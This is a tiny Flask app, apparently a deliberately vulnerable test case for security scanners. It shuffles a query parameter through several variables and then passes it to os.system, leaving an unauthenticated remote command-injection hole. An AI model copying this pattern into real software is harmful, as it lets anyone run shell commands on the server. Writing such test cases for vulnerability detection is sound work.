import os
from flask import Flask, request
app = Flask(__name__)
@app.route("/a")
def a():
    a = b = c = d = e = ""
    for _ in range(int(request.args["n"])):
        a = b
        b = c
        c = d
        d = e
        e = request.args["c"]
    os.system(a)
